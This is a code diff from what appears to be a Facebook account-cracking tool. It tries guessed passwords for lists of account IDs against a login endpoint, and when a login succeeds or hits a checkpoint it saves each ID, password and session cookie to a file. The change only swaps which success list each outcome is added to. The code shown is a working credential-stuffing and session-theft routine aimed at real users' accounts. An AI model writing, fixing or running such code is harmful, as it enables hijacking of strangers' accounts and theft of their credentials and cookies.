@@ -443,14 +443,14 @@ def login1(uid):
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:
                 cookies = ";".join([f"{i['name']}={i['value']}" for i in rp.get('session_cookies', [])])
-                cps.append(uid)
+                oks.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
                 print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
                 break
 
             elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
                 cookies = ";".join([f"{i.get('name')}={i.get('value')}" for i in rp.get('session_cookies', [])]) if "session_cookies" in rp else "NO-COOKIE"
-                oks.append(uid)
+                cps.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "|" + cookies + "\n")
                 print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw} ● COOKIE={cookies}\033[1;97m')
                 break
